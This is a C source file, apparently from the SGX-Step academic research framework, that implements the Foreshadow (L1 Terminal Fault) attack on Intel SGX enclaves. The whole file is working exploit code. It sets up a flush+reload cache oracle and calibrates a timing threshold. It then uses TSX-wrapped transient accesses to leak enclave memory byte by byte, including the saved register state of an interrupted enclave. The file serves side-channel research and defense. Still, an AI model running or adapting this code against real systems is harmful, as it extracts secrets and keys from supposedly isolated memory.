/*
 *  This file is part of the SGX-Step enclave execution control framework.
 *
 *  Copyright (C) 2017 Jo Van Bulck <jo.vanbulck@cs.kuleuven.be>,
 *                     Raoul Strackx <raoul.strackx@cs.kuleuven.be>
 *
 *  SGX-Step is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  SGX-Step is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with SGX-Step. If not, see <http://www.gnu.org/licenses/>.
 */
#include "foreshadow.h"
#include "cache.h"
#include "enclave.h"
#include "transient.h"
#include "rtm.h"
#include "debug.h"

#include <stdio.h>
#include <sys/reg.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <string.h>

// +-------------+
// |             |\
// |             | > Positive margin slots
// |             |/
// +-------------+
// |             |\
// |             | > main oracle buffer
// |             |/
// +-------------+
// |             |\
// |             | > Negative margin slots
// |             |/
// +-------------+
uint8_t *create_oracle_buffer( void )
{
    int i;
	volatile void *slot_ptr;
	uint8_t *oracle_buffer;
        
	if ( MAP_FAILED == ( oracle_buffer = mmap(	NULL,
							TOTAL_ORACLE_PAGES * 0x1000,
							PROT_EXEC | PROT_READ | PROT_WRITE,
							MAP_PRIVATE | MAP_ANONYMOUS,
							0,
							0 ) ) )
		return NULL;
	
	memset( oracle_buffer, 0x00, 0x1000 * TOTAL_ORACLE_PAGES );
	oracle_buffer = (uint8_t *)( (uint64_t) oracle_buffer + 0x1000 * CEIL( ORACLE_NEGATIVE_MARGIN_SIZE, 0x1000 ) );

    /* ensure all oracle pages are mapped in */
    for ( i=0; i < NUM_SLOTS; i++)
    {
	    slot_ptr = SLOT_OFFSET( oracle_buffer, i );
		reload( (void *) slot_ptr );
		flush( (void *) slot_ptr );
    }
	
	return oracle_buffer;
}

void destroy_oracle_buffer( uint8_t *oracle_buffer )
{
	oracle_buffer = (uint8_t *)( (uint64_t) oracle_buffer - 0x1000 * CEIL( ORACLE_NEGATIVE_MARGIN_SIZE, 0x1000 ) );
	
	munmap( oracle_buffer, TOTAL_ORACLE_PAGES );
}

int fs_reload_threshold = 0x0;
int fs_zero_retries = 0;

int __attribute__((aligned(0x1000))) fs_dummy;

void establish_fs_reload_threshold(void)
{
    unsigned long t1, t2;
    flush(&fs_dummy);
    t1 = reload(&fs_dummy);
    t2 = reload(&fs_dummy);
    fs_reload_threshold = t1-t2-60;
    info("cache hit/miss=%lu/%lu; reload threshold=%d", t2, t1, fs_reload_threshold);
}

static inline int __attribute__((always_inline)) foreshadow_round(void *adrs, void *oracle)
{
    void *slot_ptr;
    int i, fault_fired = 0;

    /*
     *  NOTE: doing the speculative, secret-dependent access a single time and
     *  then flush+reloading all 256 oracle entries at once seems to give
     *  unstable results (congruent oracle cache lines kick the
     *  secret-dependent index from the cache). At this point, we know the
     *  secret enclave cache line is in the L1 cache, however. The key
     *  therefore is to "keep the enclave cache line warm": speculatively
     *  re-access the secret in _every_ iteration (!) This works very well when
     *  using TSX, but without TSX, the secret might be kicked from the cache
     *  due to the OS #PF handler activity...
     */
    for (i=0; i < NUM_SLOTS; i++)
    {
        slot_ptr = SLOT_OFFSET( oracle, i );
        flush( slot_ptr );

        if ( rtm_begin() == 0 )
            transient_access(oracle, adrs, SLOT_SIZE);
        #if FORESHADOW_DEBUG
            else
                fault_fired++;
            ASSERT(fault_fired);
            fault_fired = 0;
        #endif

        if (reload( slot_ptr ) < fs_reload_threshold)
            return i;
    }

    return 0;
}

int foreshadow(void *adrs, void *oracle)
{
    int j, rv = 0xff;

    if (!fs_reload_threshold) 
        establish_fs_reload_threshold();

    /* Be sceptic about 0x00 bytes to compensate for the bias */
    for(j=0; !(rv = foreshadow_round(adrs, oracle)) &&
             j < FORESHADOW_ZERO_RETRIES; j++, fs_zero_retries++);

    return rv;
}

int foreshadow_ssa(gprsgx_region_t *shadow_gprsgx, void* gprsgx_alias, void* oracle)
{
    static int ssa_cur_byte = 0, ssa_zero_retries = 0;
    int j, secret;

    /* fill in shadow SSA frame */
    for (j = ssa_cur_byte; j < sizeof(gprsgx_region_t); j++)
    {
        secret = foreshadow(gprsgx_alias + j, oracle);

        /* don't overwrite non-zero (correct) readings */
        if (!shadow_gprsgx->bytes[j])
            shadow_gprsgx->bytes[j] = secret;
    }

    /*
     * Advance to next zero byte to retry.
     *
     * NOTE: the last cacheline (8 registers including RIP) seems to be almost
     * always flushed (due to the kernel #PF handler??)
     */
    for (j = ssa_cur_byte; j < sizeof(gprsgx_region_t); j++)
    {
        if (!shadow_gprsgx->bytes[j])
        {
            if (ssa_zero_retries++ < FORESHADOW_SSA_ZERO_RETRIES)
                break;
        }
    }

    if ((ssa_cur_byte = j) >= sizeof(gprsgx_region_t))
    {
        ssa_cur_byte = ssa_zero_retries = 0;
        return 0;
    }
    else
        return ssa_cur_byte ? ssa_cur_byte : -1;
}

void foreshadow_dump_perf(void)
{
    info("Foreshadow conf: 0X00_RETRIES=%d SSA_0x00_RETRIES=%d",
            FORESHADOW_ZERO_RETRIES, FORESHADOW_SSA_ZERO_RETRIES);
    info("Foreshadow perf: 0x00 retries=%d; number AEX=%d",
            fs_zero_retries, sgx_step_eresume_cnt);
}

int foreshadow_compare_secret(uint8_t *recovered, uint8_t *real, int len)
{
    int i, rv = 0;

    for (i=0; i < len; i++)
    {
        if (recovered[i] != real[i])
        {
            printf(" ** ");
            rv++;
        }
        else
            printf("    ");
        printf("shadow[%2d]=0x%02x; enclave[%2d]=0x%02x",
               i, recovered[i], i, real[i]);
        if (i % 2) printf("\n");
    }

    if (rv)
        info("[FAIL] Foreshadow missed %d bytes out of %d :/", rv, len);
    else
        info("[OK] Foreshadow correctly derived all %d bytes!", len);

    return rv;
}
